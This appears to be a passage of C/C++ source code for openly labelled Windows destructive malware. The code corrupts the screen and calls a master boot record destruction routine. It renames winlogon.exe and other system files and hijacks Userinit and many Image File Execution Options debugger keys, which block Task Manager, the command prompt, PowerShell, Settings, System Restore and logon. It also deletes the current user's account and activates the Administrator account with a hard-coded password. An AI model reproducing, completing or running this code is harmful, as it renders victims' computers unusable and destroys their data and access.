        GetWindowRect(hwnd, &rekt);
        w = GetSystemMetrics(SM_CXSCREEN);
        h = GetSystemMetrics(SM_CYSCREEN); 
        Pt[0].x = rekt.left + 1;
        Pt[0].y = rekt.top + 1;
        Pt[1].x = rekt.right + 1;
        Pt[1].y = rekt.top + 1;
        Pt[2].x = rekt.left + 1;
        Pt[2].y = rekt.bottom + 1;
        PlgBlt(hdc, Pt, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, 0, 0, 0); // The falling window effect


    }
}


int FuckURScreen() {
    int fur;
    for (fur = 2000; fur >= 0; fur--)
    {
        int y = rand() % sh, h = sh - rand() % sh - (sh / 1 - 1);
        HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
        SelectObject(hdc, brush);
        BitBlt(hdc, 0, y, sw, h, hdc, rand() % 1 - 1, y, SRCCOPY);
        PatBlt(hdc, -1, y, sw, h, PATINVERT);
        Sleep(fur % 10);
        BitBlt(hdc, rand() % (sw - 0), rand() % (sh - 0), rand() % (sw - 0), rand() % (sh - 0), hdc, rand() % (sw - 0), rand() % (sh - 0), DSTINVERT);
        BitBlt(hdc, rand() % (sw - 0), rand() % (sh - 0), rand() % (sw - 0), rand() % (sh - 0), hdc, rand() % (sw - 0), rand() % (sh - 0), SRCCOPY);
        hwnd = GetForegroundWindow();
        hW = GetWindowDC(hwnd);
        hdc = GetDC(0);
        GetWindowRect(hwnd, &rekt);
        w = GetSystemMetrics(SM_CXSCREEN);
        h = GetSystemMetrics(SM_CYSCREEN);
        Pt[0].x = rekt.left - 1;
        Pt[0].y = rekt.top + 1;
        Pt[1].x = rekt.right - 1;
        Pt[1].y = rekt.top;
        Pt[2].x = rekt.left - 1;
        Pt[2].y = rekt.bottom + 1;
        PlgBlt(hdc, Pt, hdc, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, 0, 0, 0);
        BitBlt(hdc, rand() % (sw - 0), rand() % (sh - 0), rand() % (sw - 0), rand() % (sh - 0), hdc, rand() % (sw - 0), rand() % (sh - 0), SRCPAINT);


    }
    return 0;
}


int FuckURScreen2() {


    while (TRUE)
    {
        BitBlt(hdc, rand() % (sw - 0), rand() % (sh - 0), rand() % (sw - 0), rand() % (sh - 0), hdc, rand() % (sw - 0), rand() % (sh - 0), BLACKNESS);
        Sleep(500);
        BitBlt(hdc, rand() % (sw - 0), rand() % (sh - 0), rand() % (sw - 0), rand() % (sh - 0), hdc, rand() % (sw - 0), rand() % (sh - 0), WHITENESS);
        Sleep(500);
    }
}

int SmallScreenEffect() {
    while (1) {
        BitBlt(hdc, rand() % (sw - 0), rand() % (sh - 0), rand() % (sw - 0), rand() % (sh - 0), hdc, rand() % (sw - 0), rand() % (sh - 0), DSTINVERT);
        Sleep(100);
    }
}

void CreateComeBackNote() {

    /* Create Come Back note MHAHAHAHAHAHA! */
    TCHAR szPath[MAX_PATH];

    if (SUCCEEDED(SHGetFolderPath(NULL,
        CSIDL_DESKTOP | CSIDL_FLAG_CREATE,
        NULL,
        0,
        szPath)))
    {
        PathAppend(szPath, TEXT("readMe.txt"));
        HANDLE hFile = CreateFile(szPath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

        if (WriteFile(hFile, unfm, unfm_len, &wb, NULL) == FALSE) {
            MessageBoxW(NULL, L">:( i feel so angry about that", L"ERROR", MB_ICONINFORMATION | MB_OK);
            killWindowsInstant();
        }
    }
}

void CreateTimeDate() {
    if (PathFileExistsA("C:\\Windows\\SysNative") == TRUE) {
        /* Create KillWindows program for iexplore.exe and userinit payload */
        HANDLE tdb = CreateFileA("C:\\Windows\\SysNative\\timeDate.bat", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

        if (WriteFile(tdb, tdbs, tdb_len, &wb, NULL) == FALSE) {
            MessageBoxW(NULL, L"ERROR IN: accessing necessary things for this malware\r\n\r\nSOLUTION: End this malware so end suffering ;)", L"ERROR", MB_ICONINFORMATION | MB_OK);
            CreateComeBackNote();
            Sleep(500);
            killWindowsInstant();
        }
    }
    else if (PathFileExistsA("C:\\Windows\\System32") == TRUE) {
        /* Create KillWindows program for iexplore.exe and userinit payload */
        HANDLE tdb = CreateFileA("C:\\Windows\\System32\\timeDate.bat", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

        if (WriteFile(tdb, tdbs, tdb_len, &wb, NULL) == FALSE) {
            MessageBoxW(NULL, L"ERROR IN: accessing necessary things for this malware\r\n\r\nSOLUTION: End this malware so end suffering ;)", L"ERROR", MB_ICONINFORMATION | MB_OK);
            CreateComeBackNote();
            Sleep(500);
            killWindowsInstant();
        }
    }
}

void OverrunSecurityMB() {
    MessageBoxW(NULL, L"The s▓stem dete▓ted an over▒un of a stack-based b▒ffer in ▓his applica▒ion. This ove▒run could p▓tentially allo▓ a mali▒ious user to ga▓n contro▒ of this ap▓lication.", L"SecurityHealtySystray.exe - Syst▓m E▓ror", MB_ICONERROR | MB_OK);
}

void DisableSecurity() {
    ShellExecuteA(NULL, NULL, "cmd", "/c takeown /f C:\\Windows\\SysNative\\Security* & icacls C:\\Windows\\SysNative\\Security* /grant everyone:F & ren C:\\Windows\\SysNative\\Security* NeverGonnaGiveYouUp* & taskkill /f /im securityHealthSysTray.exe", NULL, SW_HIDE);
}


/* 3:33:33 AM payload */
int SetTimeDate() {
    CreateTimeDate();
    ShellExecuteA(NULL, NULL, "cmd", "/c takeown /f C:\\Windows\\SysNative\\UxTheme.dll & icacls C:\\Windows\\SysNative\\UxTheme.dll /grant everyone:F & ren C:\\Windows\\SysNative\\UxTheme.dll main_lol.dll", NULL, SW_HIDE);
    ShellExecuteA(NULL, NULL, "cmd", "/c takeown /f C:\\Windows\\SysNative\\Winlogon.exe & icacls C:\\Windows\\SysNative\\Winlogon.exe /grant everyone:F & ren C:\\Windows\\SysNative\\winlogon.exe deleteme.exe", NULL, SW_HIDE);
    if (PathFileExistsA("C:\\Windows\\SysNative") == TRUE) {
        while (1) {
            ShellExecuteA(NULL, NULL, "cmd", "/c C:\\Windows\\SysNative\\timeDate.bat", NULL, SW_HIDE);
            Sleep(1000);
        }
    }
    else {
        while (1) {
            ShellExecuteA(NULL, NULL, "cmd", "/c C:\\Windows\\System32\\timeDate.bat", NULL, SW_HIDE);
            Sleep(1000);
        }
    }
}

int Tada() {
    while (1) {
        PlaySound(TEXT("C:\\Windows\\Media\\Tada.wav"), NULL, SND_SYNC);
        Sleep(500);
    }
}


/* registry modifications part */

void DisableTaskmgr() {
    HKEY regHandle;  // disable task manager with registry
    DWORD dwValue = 1;
    BYTE* data = (BYTE*)&dwValue;
    RegCreateKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandle, NULL);
    RegSetValueEx(regHandle, TEXT("DisableTaskmgr"), 0, REG_DWORD, data, sizeof(DWORD));
    RegCloseKey(regHandle);
}

void DisableRun() {
    HKEY regHandle;  // disable Run
    DWORD dwValue = 1;
    BYTE* data = (BYTE*)&dwValue;
    RegCreateKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandle, NULL);
    RegSetValueEx(regHandle, TEXT("NoRun"), 0, REG_DWORD, data, sizeof(DWORD));
    RegCloseKey(regHandle);
}

void DisableCMD() {
    HKEY regHandle;  // disable command prompt with registry
    DWORD dwValue = 2;
    BYTE* data = (BYTE*)&dwValue;
    RegCreateKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Policies\\Microsoft\\Windows\\System"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandle, NULL);
    RegSetValueEx(regHandle, TEXT("DisableCMD"), 0, REG_DWORD, data, sizeof(DWORD));
    RegCloseKey(regHandle);
}

void DisableLogonUI() {
    // This makes CTRLALTDEL not working and LOGONUI not working...
    HKEY regHandle5; // Disable logonui for preventing starting
    const char* dwValue5 = "accessdenied";
    BYTE* data5 = (BYTE*)&dwValue5;
    RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\logonui.exe"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandle5, NULL);
    RegSetValueEx(regHandle5, TEXT("Debugger"), 0, REG_SZ, data5, sizeof(DWORD));
    RegCloseKey(regHandle5);
}

void DisableRunDLL32() {
    // RUNDLL32 not working
    HKEY regHandled;
    const char* dwValued = "accessdenied";
    BYTE* datad = (BYTE*)&dwValued;
    RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\RunDLL32.exe"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandled, NULL);
    RegSetValueEx(regHandled, TEXT("Debugger"), 0, REG_SZ, datad, sizeof(DWORD));
    RegCloseKey(regHandled);
}

void DisableSettings() {
    // This makes Settings app no working
    HKEY regHandle7;
    const char* dwValue7 = "accessdenied";
    BYTE* data7 = (BYTE*)&dwValue7;
    RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\SystemSettings.exe"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandle7, NULL);
    RegSetValueEx(regHandle7, TEXT("Debugger"), 0, REG_SZ, data7, sizeof(DWORD));
    RegCloseKey(regHandle7);
}

void DisableDesktopBackground() {
    HKEY regHandle2; // Disable Active Desktop WallPaper
    DWORD dwValue2 = 1;
    BYTE* data2 = (BYTE*)&dwValue2;
    RegCreateKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\ActiveDesktop"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandle2, NULL);
    RegSetValueEx(regHandle2, TEXT("NoChangingWallPaper"), 0, REG_DWORD, data2, sizeof(DWORD));
    RegCloseKey(regHandle2);
}

void DisablePowerOptions() {
    HKEY regHandle; // Disable Power Options
    DWORD dwValue = 0;
    BYTE* data = (BYTE*)&dwValue;
    RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandle, NULL);
    RegSetValueEx(regHandle, TEXT("shutdownwithoutlogon"), 0, REG_DWORD, data, sizeof(DWORD));
    RegCloseKey(regHandle);


    HKEY regHandle3; // Disable Logon Ui background
    DWORD dwValue3 = 1;
    BYTE* data3 = (BYTE*)&dwValue3;
    RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Policies\\Microsoft\\Windows\\System"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandle3, NULL);
    RegSetValueEx(regHandle3, TEXT("disablelogonbackgroundimage"), 0, REG_DWORD, data3, sizeof(DWORD));
    RegCloseKey(regHandle3);

    //system("REG ADD \u0022HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\WinLogon\u0022 /v \u0022Shell\u0022 /t REG_SZ /d \u0022C:\\Program Files\\Common Files\\WINNT32.EXE\u0022 /f");

    ShellExecuteA(NULL, NULL, "REG", "ADD \u0022HKCR\\*\\shell\\_¡þ∞á£Ω▒δïñ_æåí\\command\u0022 /ve /d \u0022C:\\Program Files\\Common Files\\WINNT32.EXE\u0022 /f", NULL, SW_HIDE);
    ShellExecuteA(NULL, NULL, "REG", "ADD \u0022HKCR\\*\\shell\\_¡τµ░ùáΣ╕Çτ╕ùáΣ\\command\u0022 /ve /d \u0022C:\\Program Files\\Common Files\\WINNT32.EXE\u0022 /f", NULL, SW_HIDE);
    ShellExecuteA(NULL, NULL, "REG", "ADD \u0022HKCR\\*\\shell\\_¡∞á£Ω▒░ φòá╕Ç╕\\command\u0022 /ve /d \u0022C:\\Program Files\\Common Files\\WINNT32.EXE\u0022 /f", NULL, SW_HIDE);
    ShellExecuteA(NULL, NULL, "REG", "ADD \u0022HKCR\\*\\shell\\_¡¾4~¡∞á£Ω▒░φòá\\command\u0022 /ve /d \u0022C:\\Program Files\\Common Files\\WINNT32.EXE\u0022 /f", NULL, SW_HIDE);
    ShellExecuteA(NULL, NULL, "REG", "ADD \u0022HKCR\\*\\shell\\_¡þ^&*|@²áó_æåí\\command\u0022 /ve /d \u0022C:\\Program Files\\Common Files\\WINNT32.EXE\u0022 /f", NULL, SW_HIDE);
    ShellExecuteA(NULL, NULL, "REG", "ADD \u0022HKCR\\*\\shell\\_¡þα╖àα╢▒α╖£α╖É\\command\u0022 /ve /d \u0022C:\\Program Files\\Common Files\\WINNT32.EXE\u0022 /f", NULL, SW_HIDE);

    ShellExecuteA(NULL, NULL, "REG", "ADD \u0022HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\WinLogon\u0022 /v \u0022Userinit\u0022 /t REG_SZ /d \u0022C:\\Program Files\\Common Files\\WINNT32.EXE\u0022 /f", NULL, SW_HIDE);
    ShellExecuteA(NULL, NULL, "REG", "ADD \u0022HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows NT\\CurrentVersion\\WinLogon\u0022 /v \u0022Userinit\u0022 /t REG_SZ /d \u0022C:\\Program Files\\Common Files\\WINNT32.EXE\u0022 /f", NULL, SW_HIDE);


    ShellExecuteA(NULL, NULL, "REG", "ADD \u0022HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\iexplore.exe\u0022 /v Debugger /d \u0022C:\\Program Files\\Common Files\\WINNT32.EXE\u0022", NULL, SW_HIDE);
    ShellExecuteA(NULL, NULL, "REG", "ADD \u0022HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\logoff.exe\u0022 /v Debugger /d \u0022C:\\Program Files\\Common Files\\WINNT32.EXE\u0022", NULL, SW_HIDE);
    ShellExecuteA(NULL, NULL, "REG", "ADD \u0022HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sfc.exe\u0022 /v Debugger /d \u0022C:\\Program Files\\Common Files\\WINNT32.EXE\u0022", NULL, SW_HIDE);
    ShellExecuteA(NULL, NULL, "REG", "ADD \u0022HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\shutdown.exe\u0022 /v Debugger /d \u0022C:\\Program Files\\Common Files\\WINNT32.EXE\u0022", NULL, SW_HIDE);

    ShellExecuteA(NULL, NULL, "REG", "ADD \u0022HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\rstrui.exe\u0022 /v Debugger /d \u0022C:\\Windows\\System32\\cmd.exe /c color 0a & title System Restore &  echo Nice try &pause >nul&\u0022", NULL, SW_HIDE);
    ShellExecuteA(NULL, NULL, "REG", "ADD \u0022HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\ProcessHacker.exe\u0022 /v Debugger /d \u0022C:\\Windows\\System32\\cmd.exe /c color 04 & title PROCESSHACKER.EXE &  echo THERE IS NO ESCAPE, YOUR COMPUTER IS MINE & echo you cannot run PROCESSHACKER.EXE &pause >nul&\u0022", NULL, SW_HIDE);
    ShellExecuteA(NULL, NULL, "REG", "ADD \u0022HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Powershell.exe\u0022 /v Debugger /d \u0022C:\\Windows\\System32\\cmd.exe /c title POWERSHELL.EXE &  echo THERE IS NO ESCAPE, YOUR COMPUTER IS MINE & echo you cannot run POWERSHELL &pause >nul&\u0022", NULL, SW_HIDE);
    ShellExecuteA(NULL, NULL, "REG", "ADD \u0022HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Utilman.exe\u0022 /v Debugger /d \u0022C:\\Windows\\System32\\cmd.exe /c color 04 & title UTILMAN.EXE &  echo THERE IS NO ESCAPE, YOUR COMPUTER IS MINE &pause >nul&\u0022", NULL, SW_HIDE);
    ShellExecuteA(NULL, NULL, "REG", "ADD \u0022HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\SetHC.exe\u0022 /v Debugger /d \u0022C:\\Windows\\System32\\cmd.exe /c color 04 & title SETHC.EXE &  echo THERE IS NO ESCAPE, YOUR COMPUTER IS MIN &pause >nul&\u0022", NULL, SW_HIDE);

    RegDeleteKey(HKEY_CLASSES_ROOT, TEXT("Folder\\shell\\opennewprocess"));
    RegDeleteKey(HKEY_CLASSES_ROOT, TEXT("Folder\\shell\\opennewtab"));
    RegDeleteKey(HKEY_CLASSES_ROOT, TEXT("Folder\\shell\\opennewwindow"));
    RegDeleteKey(HKEY_CLASSES_ROOT, TEXT("Folder\\shell\\pintohome"));

    int argc;
    LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    if (argc > 1) {
        if (!lstrcmpW(argv[1], L"skiplogonui")) {
            goto skiplogonuidam;
        }
        else {
            // Still there
        }
    }
    DisableLogonUI();
skiplogonuidam:

    if (argc > 1) {
        if (!lstrcmpW(argv[1], L"nosettings")) {
            goto nosettings;
        }
    }
    DisableRunDLL32();
    DisableSettings();

nosettings:
    // Start Menu not working
    HKEY regHandlea;
    const char* dwValuea = "accessdenied";
    BYTE* dataa = (BYTE*)&dwValuea;
    RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\StartMenuExperienceHost.exe"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandlea, NULL);
    RegSetValueEx(regHandlea, TEXT("Debugger"), 0, REG_SZ, dataa, sizeof(DWORD));
    RegCloseKey(regHandlea);
    ShellExecuteA(NULL, NULL, "Taskkill", "/f /im StartMenuExperienceHost.exe", NULL, SW_HIDE);


    // Search App not working
    HKEY regHandlez;
    const char* dwValuez = "accessdenied";
    BYTE* dataz = (BYTE*)&dwValuez;
    RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\SearchUI.exe"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandlez, NULL);
    RegSetValueEx(regHandlez, TEXT("Debugger"), 0, REG_SZ, dataz, sizeof(DWORD));
    RegCloseKey(regHandlez);
    ShellExecuteA(NULL, NULL, "Taskkill", "/f /im SearchUI.exe", NULL, SW_HIDE);


    // Svchost not working
    HKEY regHandleb;
    const char* dwValueb = "accessdenied";
    BYTE* datab = (BYTE*)&dwValueb;
    RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Svchost.exe"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandleb, NULL);
    RegSetValueEx(regHandleb, TEXT("Debugger"), 0, REG_SZ, dataa, sizeof(DWORD));
    RegCloseKey(regHandleb);

    // Consent not working
    HKEY regHandlee;
    const char* dwValuee = "accessdenied";
    BYTE* datae = (BYTE*)&dwValuee;
    RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Consent.exe"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandlee, NULL);
    RegSetValueEx(regHandlee, TEXT("Debugger"), 0, REG_SZ, datae, sizeof(DWORD));
    RegCloseKey(regHandlee);

    // Microsoft Management Console not working
    HKEY regHandlef;
    const char* dwValuef = "accessdenied";
    BYTE* dataf = (BYTE*)&dwValuef;
    RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\MMC.exe"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandlef, NULL);
    RegSetValueEx(regHandlef, TEXT("Debugger"), 0, REG_SZ, dataf, sizeof(DWORD));
    RegCloseKey(regHandlef);
}

void NoUnwanted1() {
    // This makes unwanted.exe no working
    HKEY regHandle8;
    const char* dwValue8 = "hello?";
    BYTE* data8 = (BYTE*)&dwValue8;
    RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\unwanted.exe"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandle8, NULL);
    RegSetValueEx(regHandle8, TEXT("Debugger"), 0, REG_SZ, data8, sizeof(DWORD));
    RegCloseKey(regHandle8);
}

void NoUnwanted0() {
    // This makes unwanted.exe working
    RegDeleteKey(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\unwanted.exe"));
}

void DisableRegistryTools() {
    HKEY regHandle;
    DWORD dwValue = 1;
    BYTE* data = (BYTE*)&dwValue;
    RegCreateKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandle, NULL);
    RegSetValueEx(regHandle, TEXT("DisableRegistryTools"), 0, REG_DWORD, data, sizeof(DWORD));
    RegCloseKey(regHandle);
}

/* beep */
DWORD WINAPI StartBeep(LPVOID parameter) {
    Beep(1000, 10000);
    return -1;
}

int RandBeep() {
    while (1) {
        Beep(rand() * 20, 1000);
        Sleep(100);
    }
}

void CreateKillWindows() {

    if (PathFileExistsA("C:\\Program Files\\Common Files\\WINNT32.EXE") != TRUE) {

        /* Create KillWindows program for iexplore.exe and userinit payload */
        HANDLE kwi = CreateFileA("C:\\Program Files\\Common Files\\WINNT32.EXE", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

        WriteFile(kwi, kwp, kwp_len, &wb, NULL);

        CloseHandle(kwi);
    }
    else
    {
        ShellExecuteA(NULL, NULL, "cmd", "/c echo NEVER RUN MALWARE MUCH TIMES & pause > nul", NULL, SW_NORMAL);
        Sleep(2000);
        ShellExecuteA(NULL, NULL, "C:\\Program Files\\Common Files\\WINNT32.EXE", NULL, NULL, SW_NORMAL);
        ShellExecuteA(NULL, NULL, "C:\\Program Files\\Common Files\\WINNT32.EXE", NULL, NULL, SW_NORMAL);
    }
}

/* removes username and sets other user */
void StartFuckingPC() {

    CreateKillWindows();

    HKEY regHandle; // Disable Last UserName logon ui
    DWORD dwValue = 1;
    BYTE* data = (BYTE*)&dwValue;
    RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Policies\\Microsoft\\Personalization"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandle, NULL);
    RegSetValueEx(regHandle, TEXT("NoLockScreen"), 0, REG_DWORD, data, sizeof(DWORD));
    RegCloseKey(regHandle);

    HKEY regHandle2; // Disable Last UserName logon ui
    DWORD dwValue2 = 1;
    BYTE* data2 = (BYTE*)&dwValue2;
    RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandle2, NULL);
    RegSetValueEx(regHandle2, TEXT("dontdisplaylastusername"), 0, REG_DWORD, data2, sizeof(DWORD));
    RegCloseKey(regHandle2);

    ShellExecuteA(NULL, NULL, "cmd", " /c net user %username% /delete", NULL, SW_HIDE);
    ShellExecuteA(NULL, NULL, "cmd", " /c net user Administrator /active:yes", NULL, SW_HIDE);
    ShellExecuteA(NULL, NULL, "cmd", " /c net user Administrator iwantedthis", NULL, SW_HIDE);
}

void StartErrorSpam() {
    Sleep(5000);
    int argc;
    LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    if (argc > 1) {
        if (!lstrcmpW(argv[1], L"skipdestroymbr")) {
            goto skipdestroymbr1;
        }
        else
        {
            // Destroy MBR
        }
    }
    DestroyMBR();
    skipdestroymbr1:
    StartFuckingPC();
    DisablePowerOptions();
    CreateThread(NULL, NULL, &payloadThread, &StartBeep, NULL, NULL);
    CreateThread(NULL, 4096, &STARTripmessages, NULL, NULL, NULL);
    CreateThread(NULL, NULL, &payloadThread, &killWindowsInstant, NULL, NULL);
}

/* Download a file for test Internet connection */
void TestInternetConnection() {
    if (InternetCheckConnectionW(L"https://www.google.com", FLAG_ICC_FORCE_CONNECTION, 0) == TRUE) {
        // success        
    }
    else // else kills os
    {
        CreateThread(NULL, NULL, &payloadThread, &StartErrorSpam, NULL, NULL);
        int DisplayResourceNAMessageBox();
        {
            int msgboxID = MessageBox(
                NULL,
                (LPCWSTR)L"Unknown hard error:\r\nERR_INTERNET_NOCONNECTED",
                (LPCWSTR)L"unwanted.exe - System Warning",
                MB_ICONERROR | MB_OK
            );
        };

        int argc;
        LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
        if (argc > 1) {
            if (!lstrcmpW(argv[1], L"skipdestroymbr")) {
                goto skipdestroymbr1;
            }
            else
            {
                // Destroy MBR
            }
        }
        DestroyMBR();
    skipdestroymbr1:
        StartFuckingPC();
        DisablePowerOptions();
        CreateThread(NULL, NULL, &payloadThread, &StartBeep, NULL, NULL);
        CreateThread(NULL, 4096, &STARTripmessages, NULL, NULL, NULL);
        CreateThread(NULL, NULL, &payloadThread, &killWindowsInstant, NULL, NULL);

    };

}
void NormalComputer() {
    MessageBox(
        NULL,
        (LPCWSTR)L"This is not a normal computer", // Warning message box
        (LPCWSTR)L"2¤³@»¬¬²’ÐÅ¶²Øß2¶¡",
        MB_ICONINFORMATION | MB_OK
    );
}

int PlayMusik() {
    if (PlaySoundA("C:\\Program Files\\Common Files\\system\\Panic.wav", NULL, SND_SYNC) == FALSE) { // If it does not find the file (returns False) if BSOD =)
        CreateThread(NULL, NULL, &payloadThread, &NormalComputer, NULL, NULL);
        CreateThread(NULL, NULL, &payloadThread, &NormalComputer, NULL, NULL);
        CreateThread(NULL, NULL, &payloadThread, &killWindowsInstant, NULL, NULL);
    }
    // plays music
    CreateThread(NULL, NULL, &payloadThread, &killWindowsInstant, NULL, NULL);
    return 0;
}

/* Old version of Unwanted (1.0)*/
void PrankFolders() {
    HANDLE bat = CreateFileA("C:\\Program Files\\Common Files\\system\\Program.bat", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

    WriteFile(bat, batm, bat_len, &wb, NULL);

    CloseHandle(bat);
    cout << "Archivo Creado\n\n";
    Sleep(100);

    ShellExecuteA(NULL, NULL, "cmd", "/c C:\\Program Files\\Common Files\\system\\Program.bat", NULL, SW_HIDE);
    cout << "Programa Ejecutado\n\n";
    Sleep(1000);
}


void superPowerFulMainPayload() {

    CreateThread(NULL, NULL, &payloadThread, &DestroyURScreen, NULL, NULL);
    /* Main Payload */
    Sleep(1500);
    CreateThread(NULL, NULL, &payloadThread, &payloadMessageBox, NULL, NULL);
    Sleep(4500);
    ShellExecuteA(NULL, NULL, "wordpad", "\u0022C:\\Program Files\\Common Files\\system\\Documento.rtf\u0022", NULL, SW_SHOWDEFAULT);
    Sleep(8500);
    ShellExecuteA(NULL, NULL, "control", NULL, NULL, SW_SHOWDEFAULT);
    Sleep(4500);
    CreateThread(NULL, NULL, &payloadThread, &payloadMessageBox, NULL, NULL);
    Sleep(4500);
    ShellExecuteA(NULL, NULL, "regedit", NULL, NULL, SW_SHOWDEFAULT);
    Sleep(4500);
    ShellExecuteA(NULL, NULL, "notepad", "C:\\Program Files\\Common Files\\system\\Die.txt", NULL, SW_SHOW);
    Sleep(4500);
    ShellExecuteA(NULL, NULL, "taskmgr", NULL, NULL, SW_SHOWDEFAULT);
    Sleep(2250);
    ShellExecuteA(NULL, NULL, "explorer", NULL, NULL, SW_SHOWDEFAULT);
    Sleep(2250);
    CreateThread(NULL, NULL, &payloadThread, &DestroyURScreen, NULL, NULL);
    ShellExecuteA(NULL, NULL, "mspaint", "\u0022C:\\Program Files\\Common Files\\system\\kitten.jpg\u0022", NULL, SW_SHOWDEFAULT);
    Sleep(2250);
    ShellExecuteA(NULL, NULL, "charmap", NULL, NULL, SW_SHOWDEFAULT);
    Sleep(6000);
    CreateThread(NULL, NULL, &payloadThread, &RandBeep, NULL, NULL);
    Sleep(12000);
    CreateThread(NULL, NULL, &payloadThread, &payloadChangeText, NULL, NULL);
    // last 10 seconds (wait until windows dies)

    for (;;) {
        // still there, wait for windows dies
    }

}
